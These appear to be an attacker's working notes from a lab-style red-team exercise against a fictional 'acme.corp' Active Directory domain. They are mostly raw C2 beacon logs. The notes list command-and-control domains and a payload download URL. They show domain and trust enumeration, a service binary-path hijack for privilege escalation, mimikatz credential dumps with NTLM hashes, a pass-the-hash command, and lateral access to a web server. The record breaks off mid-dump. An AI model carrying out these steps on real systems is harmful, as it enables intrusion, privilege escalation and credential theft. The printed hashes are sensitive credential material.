


artifact kit
- artifact32.exe
	- clean


- qrictgydszhlhw.info
- nbqtddutqn.org
- znkfchsslimnfp.info
- bforgbdaurgjettxago.com



we can get call back through HTTP

http://znkfchsslimnfp.info:8080/download/be.exe

http://znkfchsslimnfp.info:8080/download/be.exe



```

```



LANDED ON HOST FINALLY TIME TO ENUMERATE

THERE IS CLM POWERPICK HJELPS EVADE CLM


```
[04/23 12:57:13] beacon> powerpick Get-Domain
[04/23 12:57:13] [*] Tasked beacon to run: Get-Domain (unmanaged)
[04/23 12:57:14] [+] host called home, sent: 138058 bytes
[04/23 12:57:17] [+] received output:


Forest                  : acme.corp
DomainControllers       : {dc.acme.corp}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : 
PdcRoleOwner            : dc.acme.corp
RidRoleOwner            : dc.acme.corp
InfrastructureRoleOwner : dc.acme.corp
Name                    : acme.corp
```


```
[04/23 13:00:23] beacon> powerpick Get-DomainController | select Forest, Name, OSVersion | fl
[04/23 13:00:23] [*] Tasked beacon to run: Get-DomainController | select Forest, Name, OSVersion | fl (unmanaged)
[04/23 13:00:25] [+] host called home, sent: 138058 bytes
[04/23 13:00:28] [+] received output:


Forest    : acme.corp
Name      : dc.acme.corp
OSVersion : Windows Server 2022 Datacenter
```


```
[04/23 13:00:59] beacon> powerpick Get-ForestDomain
[04/23 13:00:59] [*] Tasked beacon to run: Get-ForestDomain (unmanaged)
[04/23 13:01:01] [+] host called home, sent: 138058 bytes
[04/23 13:01:05] [+] received output:


Forest                  : acme.corp
DomainControllers       : {dc.acme.corp}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : 
PdcRoleOwner            : dc.acme.corp
RidRoleOwner            : dc.acme.corp
InfrastructureRoleOwner : dc.acme.corp
Name                    : acme.corp
```


## ACME FOREST COMMPUTERS


```
[04/23 13:02:31] beacon> powerpick Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName
[04/23 13:02:31] [*] Tasked beacon to run: Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName (unmanaged)
[04/23 13:02:33] [+] host called home, sent: 138058 bytes
[04/23 13:02:36] [+] received output:

dnshostname    
-----------    
dc.acme.corp   
web.acme.corp  
wkstn.acme.corp
```


```
[04/23 13:03:11] beacon> powerpick Get-DomainTrust
[04/23 13:03:11] [*] Tasked beacon to run: Get-DomainTrust (unmanaged)
[04/23 13:03:12] [+] host called home, sent: 138058 bytes
[04/23 13:03:15] [+] received output:


SourceName      : acme.corp
TargetName      : kato.org
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Inbound
WhenCreated     : 06/10/2022 12:17:31
WhenChanged     : 23/04/2025 08:50:38
```


```python
[04/23 13:04:40] beacon> powerpick Get-DomainTrustMapping
[04/23 13:04:40] [*] Tasked beacon to run: Get-DomainTrustMapping (unmanaged)
[04/23 13:04:41] [+] host called home, sent: 138058 bytes
[04/23 13:04:44] [+] received output:


SourceName      : acme.corp
TargetName      : kato.org
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Inbound
WhenCreated     : 06/10/2022 12:17:31
WhenChanged     : 23/04/2025 08:50:38


[04/23 13:04:47] [+] received output:
SourceName      : kato.org
TargetName      : acme.corp
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 06/10/2022 12:17:32
WhenChanged     : 23/04/2025 08:50:38

SourceName      : kato.org
TargetName      : kato.esae
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FILTER_SIDS
TrustDirection  : Outbound
WhenCreated     : 06/10/2022 14:01:03
WhenChanged     : 23/04/2025 08:50:39
```



```python
[04/23 13:08:08] beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe all
[04/23 13:08:09] [*] Tasked beacon to run .NET program: SharpUp.exe all
[04/23 13:08:11] [+] host called home, sent: 149250 bytes
[04/23 13:08:12] [+] received output:

=== SharpUp: Running Privilege Escalation Checks ===

[-] Not vulnerable to any of the 0 checked modules.


[*] Completed Privesc Checks in 0 seconds


[04/23 13:08:15] [+] received output:

=== Unattended Install Files ===
	C:\Windows\Panther\Unattend.xml


=== Modifiable Services ===
	[X] Exception: Exception has been thrown by the target of an invocation.
	[X] Exception: Exception has been thrown by the target of an invocation.
	[X] Exception: Exception has been thrown by the target of an invocation.
	[X] Exception: Exception has been thrown by the target of an invocation.
	Service 'svc_test' (State: Stopped, StartMode: Manual)



[*] Completed Privesc Checks in 23 seconds

```



```python
[04/23 13:08:27] beacon> run sc qc svc_test
[04/23 13:08:27] [*] Tasked beacon to run: sc qc svc_test
[04/23 13:08:28] [+] host called home, sent: 32 bytes
[04/23 13:08:28] [+] received output:
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: svc_test
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files\Test Service\Test Service.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : svc_test
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem

```



```python
[04/23 13:23:15] beacon> powerpick Get-Acl -Path "C:\Program Files\Test Service" | fl
[04/23 13:23:15] [*] Tasked beacon to run: Get-Acl -Path "C:\Program Files\Test Service" | fl (unmanaged)
[04/23 13:23:16] [+] host called home, sent: 138058 bytes
[04/23 13:23:19] [+] received output:


Path   : Microsoft.PowerShell.Core\FileSystem::C:\Program Files\Test Service
Owner  : BUILTIN\Administrators
Group  : WKSTN\None
Access : NT SERVICE\TrustedInstaller Allow  FullControl
         NT SERVICE\TrustedInstaller Allow  268435456
         NT AUTHORITY\SYSTEM Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  268435456
         BUILTIN\Administrators Allow  FullControl
         BUILTIN\Administrators Allow  268435456
         BUILTIN\Users Allow  ReadAndExecute, Synchronize   <----------------------------------------- ME
         BUILTIN\Users Allow  -1610612736
         CREATOR OWNER Allow  268435456
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  -1610612736
         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  ReadAndExecute, 
         Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  -1610612736
Audit  : 
Sddl   : O:BAG:S-1-5-21-2281971671-4135076198-2136761646-513D:AI(A;ID;FA;;;S-1-5-80-956008885-34185
         22649-1831038044-1853292631-2271478464)(A;CIIOID;GA;;;S-1-5-80-956008885-3418522649-183103
         8044-1853292631-2271478464)(A;ID;FA;;;SY)(A;OICIIOID;GA;;;SY)(A;ID;FA;;;BA)(A;OICIIOID;GA;
         ;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;BU)(A;OICIIOID;GA;;;CO)(A;ID;0x1200a9;;;AC)(A;
         OICIIOID;GXGR;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;;;S-1-15-2-2)


```




```Python
[04/23 13:30:18] beacon> powerpick Get-ServiceAcl -Name svc_test | select -expand Access
[04/23 13:30:18] [*] Tasked beacon to run: Get-ServiceAcl -Name svc_test | select -expand Access (unmanaged)
[04/23 13:30:20] [+] host called home, sent: 138058 bytes
[04/23 13:30:24] [+] received output:


ServiceRights     : QueryConfig, QueryStatus, EnumerateDependents, Interrogate, 
                    UserDefinedControl, ReadControl
AccessControlType : AccessAllowed
IdentityReference : NT AUTHORITY\INTERACTIVE
IsInherited       : False
InheritanceFlags  : None
PropagationFlags  : None

ServiceRights     : QueryConfig, QueryStatus, EnumerateDependents, Interrogate, 
                    UserDefinedControl, ReadControl
AccessControlType : AccessAllowed
IdentityReference : NT AUTHORITY\SERVICE
IsInherited       : False
InheritanceFlags  : None
PropagationFlags  : None

ServiceRights     : ChangeConfig, Start, Stop
AccessControlType : AccessAllowed
IdentityReference : NT AUTHORITY\Authenticated Users   <------------------- LOOK AT ME
IsInherited       : False
InheritanceFlags  : None
PropagationFlags  : None

ServiceRights     : QueryConfig, QueryStatus, EnumerateDependents, Start, Stop, PauseContinue, 
                    Interrogate, UserDefinedControl, ReadControl
AccessControlType : AccessAllowed
IdentityReference : NT AUTHORITY\SYSTEM
IsInherited       : False
InheritanceFlags  : None
PropagationFlags  : None

ServiceRights     : QueryConfig, ChangeConfig, QueryStatus, EnumerateDependents, Start, Stop, 
                    PauseContinue, Interrogate, UserDefinedControl, Delete, ReadControl, WriteDac, 
                    WriteOwner
AccessControlType : AccessAllowed
IdentityReference : BUILTIN\Administrators
IsInherited       : False
InheritanceFlags  : None
PropagationFlags  : None

```




```
[04/23 13:33:29] beacon> run sc config svc_test binPath= C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System\Test.exe
[04/23 13:33:29] [*] Tasked beacon to run: sc config svc_test binPath= C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System\Test.exe
[04/23 13:33:30] [+] host called home, sent: 109 bytes
[04/23 13:33:30] [+] received output:
[SC] ChangeServiceConfig SUCCESS
```




## FIRST HOST


```python
[04/23 13:41:37] beacon> logonpasswords
[04/23 13:41:37] [*] Tasked beacon to run mimikatz's sekurlsa::logonpasswords command
[04/23 13:41:39] [+] host called home, sent: 313675 bytes
[04/23 13:41:40] [+] received output:

Authentication Id : 0 ; 438553 (00000000:0006b119)
Session           : RemoteInteractive from 2
User Name         : consultant
Domain            : ACME
Logon Server      : DC
Logon Time        : 4/23/2025 9:37:41 AM
SID               : S-1-5-21-951568539-2129440919-2691824384-1103
	msv :	
	 [00000003] Primary
	 * Username : consultant
	 * Domain   : ACME
	 * NTLM     : 37dd0e1e8fb505d2e5baaf4a27d2ddbd
	 * SHA1     : a7b47e854f35291b6c534db95fc7976c63a3a15a
	 * DPAPI    : e24686bf07e58d5dd2f4e8445fde7f88
	tspkg :	
	wdigest :	
	 * Username : consultant
	 * Domain   : ACME
	 * Password : (null)
	kerberos :	
	 * Username : consultant
	 * Domain   : ACME.CORP
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 352682 (00000000:000561aa)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/23/2025 9:37:35 AM
SID               : S-1-5-90-0-2
	msv :	
	 [00000003] Primary
	 * Username : WKSTN$
	 * Domain   : ACME
	 * NTLM     : 36a176d083a1d6e4d2c80701611da9a4
	 * SHA1     : 2de2d707f7d308e83537d83c1323ba59f5bdea16
	tspkg :	
	wdigest :	
	 * Username : WKSTN$
	 * Domain   : ACME
	 * Password : (null)
	kerberos :	
	 * Username : WKSTN$
	 * Domain   : acme.corp
	 * Password : 73 54 27 0b 7e 8c b5 bb e6 fe 94 4a fe 0e a1 ba 63 1c 7f 5e 7f 5e 71 0b d9 16 e3 3b 9a 2e 87 65 b8 79 0a 56 5e 5d 29 a1 32 5e cf 69 35 72 b4 56 e4 8d fd 49 88 72 bb f2 32 23 65 4e c4 32 c8 50 a8 a9 12 92 a1 70 de c0 72 06 17 bd 6a 1c 35 3f a3 be a3 7b a0 d3 1c 76 c1 25 b5 c3 e4 58 7f 5a 7c c1 6f c1 ae f9 53 7b c5 70 e1 ef af 3f f8 88 ac f0 48 0d b9 5e 74 66 14 b4 ac 3a 97 b2 00 e5 ff a8 d2 5f 20 c0 5d 3a 6a aa fe cc 37 03 59 51 e7 c6 cb 69 46 ef a3 e8 c8 a1 44 cf 7b 9c 97 9f a4 24 3a b3 cd 2d 22 bf f6 b4 00 29 c1 bc 40 ca 89 39 e4 9a 1d 32 86 81 5a 4a 26 59 31 9d c2 c7 5e b6 16 a0 da 5e 64 fe cb 4f 78 d4 98 26 ab 8b 89 e5 b5 f5 f8 87 e3 ed 7f f9 dc 74 16 d0 21 8a c4 ac c2 7c b0 01 66 2d 7c 1c f0 9f 2c 40 5b 60 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 352453 (00000000:000560c5)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/23/2025 9:37:35 AM
SID               : S-1-5-90-0-2
	msv :	
	 [00000003] Primary
	 * Username : WKSTN$
	 * Domain   : ACME
	 * NTLM     : 36a176d083a1d6e4d2c80701611da9a4
	 * SHA1     : 2de2d707f7d308e83537d83c1323ba59f5bdea16
	tspkg :	
	wdigest :	
	 * Username : WKSTN$
	 * Domain   : ACME
	 * Password : (null)
	kerberos :	
	 * Username : WKSTN$
	 * Domain   : acme.corp
	 * Password : 73 54 27 0b 7e 8c b5 bb e6 fe 94 4a fe 0e a1 ba 63 1c 7f 5e 7f 5e 71 0b d9 16 e3 3b 9a 2e 87 65 b8 79 0a 56 5e 5d 29 a1 32 5e cf 69 35 72 b4 56 e4 8d fd 49 88 72 bb f2 32 23 65 4e c4 32 c8 50 a8 a9 12 92 a1 70 de c0 72 06 17 bd 6a 1c 35 3f a3 be a3 7b a0 d3 1c 76 c1 25 b5 c3 e4 58 7f 5a 7c c1 6f c1 ae f9 53 7b c5 70 e1 ef af 3f f8 88 ac f0 48 0d b9 5e 74 66 14 b4 ac 3a 97 b2 00 e5 ff a8 d2 5f 20 c0 5d 3a 6a aa fe cc 37 03 59 51 e7 c6 cb 69 46 ef a3 e8 c8 a1 44 cf 7b 9c 97 9f a4 24 3a b3 cd 2d 22 bf f6 b4 00 29 c1 bc 40 ca 89 39 e4 9a 1d 32 86 81 5a 4a 26 59 31 9d c2 c7 5e b6 16 a0 da 5e 64 fe cb 4f 78 d4 98 26 ab 8b 89 e5 b5 f5 f8 87 e3 ed 7f f9 dc 74 16 d0 21 8a c4 ac c2 7c b0 01 66 2d 7c 1c f0 9f 2c 40 5b 60 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 351421 (00000000:00055cbd)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/23/2025 9:37:35 AM
SID               : S-1-5-96-0-2
	msv :	
	 [00000003] Primary
	 * Username : WKSTN$
	 * Domain   : ACME
	 * NTLM     : 36a176d083a1d6e4d2c80701611da9a4
	 * SHA1     : 2de2d707f7d308e83537d83c1323ba59f5bdea16
	tspkg :	
	wdigest :	
	 * Username : WKSTN$
	 * Domain   : ACME
	 * Password : (null)
	kerberos :	
	 * Username : WKSTN$
	 * Domain   : acme.corp
	 * Password : 73 54 27 0b 7e 8c b5 bb e6 fe 94 4a fe 0e a1 ba 63 1c 7f 5e 7f 5e 71 0b d9 16 e3 3b 9a 2e 87 65 b8 79 0a 56 5e 5d 29 a1 32 5e cf 69 35 72 b4 56 e4 8d fd 49 88 72 bb f2 32 23 65 4e c4 32 c8 50 a8 a9 12 92 a1 70 de c0 72 06 17 bd 6a 1c 35 3f a3 be a3 7b a0 d3 1c 76 c1 25 b5 c3 e4 58 7f 5a 7c c1 6f c1 ae f9 53 7b c5 70 e1 ef af 3f f8 88 ac f0 48 0d b9 5e 74 66 14 b4 ac 3a 97 b2 00 e5 ff a8 d2 5f 20 c0 5d 3a 6a aa fe cc 37 03 59 51 e7 c6 cb 69 46 ef a3 e8 c8 a1 44 cf 7b 9c 97 9f a4 24 3a b3 cd 2d 22 bf f6 b4 00 29 c1 bc 40 ca 89 39 e4 9a 1d 32 86 81 5a 4a 26 59 31 9d c2 c7 5e b6 16 a0 da 5e 64 fe cb 4f 78 d4 98 26 ab 8b 89 e5 b5 f5 f8 87 e3 ed 7f f9 dc 74 16 d0 21 8a c4 ac c2 7c b0 01 66 2d 7c 1c f0 9f 2c 40 5b 60 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 258207 (00000000:0003f09f)
Session           : Batch from 0
User Name         : pcotton  <------------------------------------------------------ USER
Domain            : ACME
Logon Server      : DC
Logon Time        : 4/23/2025 9:36:57 AM
SID               : S-1-5-21-951568539-2129440919-2691824384-1105
	msv :	
	 [00000003] Primary
	 * Username : pcotton              <------------------------------------------------------ USER
	 * Domain   : ACME
	 * NTLM     : cafd6970609208fed259fc5c89b8acac
	 * SHA1     : afb186767e473eb2f79c545a42f7d11b852861ab
	 * DPAPI    : 1aed5b7c0c62afef065f20af6621aa2d
	tspkg :	
	wdigest :	
	 * Username : pcotton  <------------------------------------------------------ USER
	 * Domain   : ACME
	 * Password : (null)
	kerberos :	
	 * Username : pcotton
	 * Domain   : ACME.CORP
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 4/23/2025 8:36:28 AM
SID               : S-1-5-19
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 66017 (00000000:000101e1)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/23/2025 8:36:27 AM
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Primary
	 * Username : WKSTN$
	 * Domain   : ACME
	 * NTLM     : 36a176d083a1d6e4d2c80701611da9a4
	 * SHA1     : 2de2d707f7d308e83537d83c1323ba59f5bdea16
	tspkg :	
	wdigest :	
	 * Username : WKSTN$
	 * Domain   : ACME
	 * Password : (null)
	kerberos :	
	 * Username : WKSTN$
	 * Domain   : acme.corp
	 * Password : 73 54 27 0b 7e 8c b5 bb e6 fe 94 4a fe 0e a1 ba 63 1c 7f 5e 7f 5e 71 0b d9 16 e3 3b 9a 2e 87 65 b8 79 0a 56 5e 5d 29 a1 32 5e cf 69 35 72 b4 56 e4 8d fd 49 88 72 bb f2 32 23 65 4e c4 32 c8 50 a8 a9 12 92 a1 70 de c0 72 06 17 bd 6a 1c 35 3f a3 be a3 7b a0 d3 1c 76 c1 25 b5 c3 e4 58 7f 5a 7c c1 6f c1 ae f9 53 7b c5 70 e1 ef af 3f f8 88 ac f0 48 0d b9 5e 74 66 14 b4 ac 3a 97 b2 00 e5 ff a8 d2 5f 20 c0 5d 3a 6a aa fe cc 37 03 59 51 e7 c6 cb 69 46 ef a3 e8 c8 a1 44 cf 7b 9c 97 9f a4 24 3a b3 cd 2d 22 bf f6 b4 00 29 c1 bc 40 ca 89 39 e4 9a 1d 32 86 81 5a 4a 26 59 31 9d c2 c7 5e b6 16 a0 da 5e 64 fe cb 4f 78 d4 98 26 ab 8b 89 e5 b5 f5 f8 87 e3 ed 7f f9 dc 74 16 d0 21 8a c4 ac c2 7c b0 01 66 2d 7c 1c f0 9f 2c 40 5b 60 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 65999 (00000000:000101cf)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/23/2025 8:36:27 AM
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Primary
	 * Username : WKSTN$
	 * Domain   : ACME
	 * NTLM     : 36a176d083a1d6e4d2c80701611da9a4
	 * SHA1     : 2de2d707f7d308e83537d83c1323ba59f5bdea16
	tspkg :	
	wdigest :	
	 * Username : WKSTN$
	 * Domain   : ACME
	 * Password : (null)
	kerberos :	
	 * Username : WKSTN$
	 * Domain   : acme.corp
	 * Password : 73 54 27 0b 7e 8c b5 bb e6 fe 94 4a fe 0e a1 ba 63 1c 7f 5e 7f 5e 71 0b d9 16 e3 3b 9a 2e 87 65 b8 79 0a 56 5e 5d 29 a1 32 5e cf 69 35 72 b4 56 e4 8d fd 49 88 72 bb f2 32 23 65 4e c4 32 c8 50 a8 a9 12 92 a1 70 de c0 72 06 17 bd 6a 1c 35 3f a3 be a3 7b a0 d3 1c 76 c1 25 b5 c3 e4 58 7f 5a 7c c1 6f c1 ae f9 53 7b c5 70 e1 ef af 3f f8 88 ac f0 48 0d b9 5e 74 66 14 b4 ac 3a 97 b2 00 e5 ff a8 d2 5f 20 c0 5d 3a 6a aa fe cc 37 03 59 51 e7 c6 cb 69 46 ef a3 e8 c8 a1 44 cf 7b 9c 97 9f a4 24 3a b3 cd 2d 22 bf f6 b4 00 29 c1 bc 40 ca 89 39 e4 9a 1d 32 86 81 5a 4a 26 59 31 9d c2 c7 5e b6 16 a0 da 5e 64 fe cb 4f 78 d4 98 26 ab 8b 89 e5 b5 f5 f8 87 e3 ed 7f f9 dc 74 16 d0 21 8a c4 ac c2 7c b0 01 66 2d 7c 1c f0 9f 2c 40 5b 60 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : WKSTN$
Domain            : ACME
Logon Server      : (null)
Logon Time        : 4/23/2025 8:36:23 AM
SID               : S-1-5-20
	msv :	
	 [00000003] Primary
	 * Username : WKSTN$
	 * Domain   : ACME
	 * NTLM     : 36a176d083a1d6e4d2c80701611da9a4
	 * SHA1     : 2de2d707f7d308e83537d83c1323ba59f5bdea16
	tspkg :	
	wdigest :	
	 * Username : WKSTN$
	 * Domain   : ACME
	 * Password : (null)
	kerberos :	
	 * Username : wkstn$
	 * Domain   : ACME.CORP
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 36046 (00000000:00008cce)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/23/2025 8:36:19 AM
SID               : S-1-5-96-0-1
	msv :	
	 [00000003] Primary
	 * Username : WKSTN$
	 * Domain   : ACME
	 * NTLM     : 36a176d083a1d6e4d2c80701611da9a4
	 * SHA1     : 2de2d707f7d308e83537d83c1323ba59f5bdea16
	tspkg :	
	wdigest :	
	 * Username : WKSTN$
	 * Domain   : ACME
	 * Password : (null)
	kerberos :	
	 * Username : WKSTN$
	 * Domain   : acme.corp
	 * Password : 73 54 27 0b 7e 8c b5 bb e6 fe 94 4a fe 0e a1 ba 63 1c 7f 5e 7f 5e 71 0b d9 16 e3 3b 9a 2e 87 65 b8 79 0a 56 5e 5d 29 a1 32 5e cf 69 35 72 b4 56 e4 8d fd 49 88 72 bb f2 32 23 65 4e c4 32 c8 50 a8 a9 12 92 a1 70 de c0 72 06 17 bd 6a 1c 35 3f a3 be a3 7b a0 d3 1c 76 c1 25 b5 c3 e4 58 7f 5a 7c c1 6f c1 ae f9 53 7b c5 70 e1 ef af 3f f8 88 ac f0 48 0d b9 5e 74 66 14 b4 ac 3a 97 b2 00 e5 ff a8 d2 5f 20 c0 5d 3a 6a aa fe cc 37 03 59 51 e7 c6 cb 69 46 ef a3 e8 c8 a1 44 cf 7b 9c 97 9f a4 24 3a b3 cd 2d 22 bf f6 b4 00 29 c1 bc 40 ca 89 39 e4 9a 1d 32 86 81 5a 4a 26 59 31 9d c2 c7 5e b6 16 a0 da 5e 64 fe cb 4f 78 d4 98 26 ab 8b 89 e5 b5 f5 f8 87 e3 ed 7f f9 dc 74 16 d0 21 8a c4 ac c2 7c b0 01 66 2d 7c 1c f0 9f 2c 40 5b 60 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 36045 (00000000:00008ccd)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/23/2025 8:36:19 AM
SID               : S-1-5-96-0-0
	msv :	
	 [00000003] Primary
	 * Username : WKSTN$
	 * Domain   : ACME
	 * NTLM     : 36a176d083a1d6e4d2c80701611da9a4
	 * SHA1     : 2de2d707f7d308e83537d83c1323ba59f5bdea16
	tspkg :	
	wdigest :	
	 * Username : WKSTN$
	 * Domain   : ACME
	 * Password : (null)
	kerberos :	
	 * Username : WKSTN$
	 * Domain   : acme.corp
	 * Password : 73 54 27 0b 7e 8c b5 bb e6 fe 94 4a fe 0e a1 ba 63 1c 7f 5e 7f 5e 71 0b d9 16 e3 3b 9a 2e 87 65 b8 79 0a 56 5e 5d 29 a1 32 5e cf 69 35 72 b4 56 e4 8d fd 49 88 72 bb f2 32 23 65 4e c4 32 c8 50 a8 a9 12 92 a1 70 de c0 72 06 17 bd 6a 1c 35 3f a3 be a3 7b a0 d3 1c 76 c1 25 b5 c3 e4 58 7f 5a 7c c1 6f c1 ae f9 53 7b c5 70 e1 ef af 3f f8 88 ac f0 48 0d b9 5e 74 66 14 b4 ac 3a 97 b2 00 e5 ff a8 d2 5f 20 c0 5d 3a 6a aa fe cc 37 03 59 51 e7 c6 cb 69 46 ef a3 e8 c8 a1 44 cf 7b 9c 97 9f a4 24 3a b3 cd 2d 22 bf f6 b4 00 29 c1 bc 40 ca 89 39 e4 9a 1d 32 86 81 5a 4a 26 59 31 9d c2 c7 5e b6 16 a0 da 5e 64 fe cb 4f 78 d4 98 26 ab 8b 89 e5 b5 f5 f8 87 e3 ed 7f f9 dc 74 16 d0 21 8a c4 ac c2 7c b0 01 66 2d 7c 1c f0 9f 2c 40 5b 60 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 35027 (00000000:000088d3)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 4/23/2025 8:36:14 AM
SID               : 
	msv :	
	 [00000003] Primary
	 * Username : WKSTN$
	 * Domain   : ACME
	 * NTLM     : 36a176d083a1d6e4d2c80701611da9a4
	 * SHA1     : 2de2d707f7d308e83537d83c1323ba59f5bdea16
	tspkg :	
	wdigest :	
	kerberos :	
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : WKSTN$
Domain            : ACME
Logon Server      : (null)
Logon Time        : 4/23/2025 8:36:12 AM
SID               : S-1-5-18
	msv :	
	tspkg :	
	wdigest :	
	 * Username : WKSTN$
	 * Domain   : ACME
	 * Password : (null)
	kerberos :	
	 * Username : wkstn$
	 * Domain   : ACME.CORP
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

```



```
pth ACME\pcotton 36a176d083a1d6e4d2c80701611da9a4
```



### Local Administrator


```python
[04/23 14:04:30] beacon> powerpick Get-DomainGPOLocalGroup | select GPODisplayName, GroupName
[04/23 14:04:30] [*] Tasked beacon to run: Get-DomainGPOLocalGroup | select GPODisplayName, GroupName (unmanaged)
[04/23 14:04:33] [+] host called home, sent: 138082 bytes
[04/23 14:04:36] [+] received output:


[04/23 14:04:39] [+] received output:
GPODisplayName     GroupName     
--------------     ---------     
Workstation Admins ACME\Sysadmins
Server Admins      ACME\Sysadmins

```



```python
[04/23 14:06:52] beacon> powerpick Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName | fl
[04/23 14:06:52] [*] Tasked beacon to run: Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName | fl (unmanaged)
[04/23 14:06:53] [+] host called home, sent: 138082 bytes
[04/23 14:06:58] [+] received output:


ObjectName     : Sysadmins
GPODisplayName : Workstation Admins
ContainerName  : {OU=Workstations,DC=acme,DC=corp}
ComputerName   : {wkstn.acme.corp}

ObjectName     : Sysadmins
GPODisplayName : Server Admins
ContainerName  : {OU=Servers,DC=acme,DC=corp}
ComputerName   : {web.acme.corp}


```



### ACCESS TO WEB CONFIRMED


```python
[04/23 14:17:13] beacon> ls \\web.acme.corp\C$
[04/23 14:17:13] [*] Tasked beacon to list files in \\web.acme.corp\C$
[04/23 14:17:15] [+] host called home, sent: 36 bytes
[04/23 14:17:16] [*] Listing: \\web.acme.corp\C$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     10/06/2022 12:25:14   $Recycle.Bin
          dir     09/14/2022 17:07:20   $WinREAgent
          dir     09/14/2022 17:18:55   Boot
          dir     08/19/2021 00:34:55   Documents and Settings
          dir     08/19/2021 07:24:49   EFI
          dir     05/08/2021 09:20:24   PerfLogs
          dir     08/19/2021 07:35:15   Program Files
          dir     09/14/2022 16:19:23   Program Files (x86)
          dir     10/11/2022 12:17:13   ProgramData
          dir     10/06/2022 11:22:27   Recovery
          dir     10/06/2022 11:35:22   System Volume Information
          dir     10/06/2022 11:23:52   Users
          dir     10/06/2022 11:22:21   Windows
 427kb    fil     09/14/2022 17:13:26   bootmgr
 1b       fil     05/08/2021 09:14:33   BOOTNXT
 12kb     fil     04/23/2025 09:34:46   DumpStack.log.tmp
 384mb    fil     04/23/2025 09:34:46   pagefile.sys
```


## DUMPING WEB


```python
[04/23 14:22:08] beacon> logonpasswords
[04/23 14:22:08] [*] Tasked beacon to run mimikatz's sekurlsa::logonpasswords command
[04/23 14:22:11] [+] host called home, sent: 313675 bytes
[04/23 14:22:12] [+] received output:

Authentication Id : 0 ; 62342 (00000000:0000f386)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/23/2025 8:34:52 AM
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Primary
	 * Username : WEB$
	 * Domain   : ACME
	 * NTLM     : 3d45daee0c88fcda6d325b9f5581549c
	 * SHA1     : 9dd06de9eaefc3fe2f1f139635a93ff81ccdf15d
	tspkg :	
	wdigest :	
	 * Username : WEB$
	 * Domain   : ACME
	 * Password : (null)
	kerberos :	
	 * Username : WEB$
	 * Domain   : acme.corp
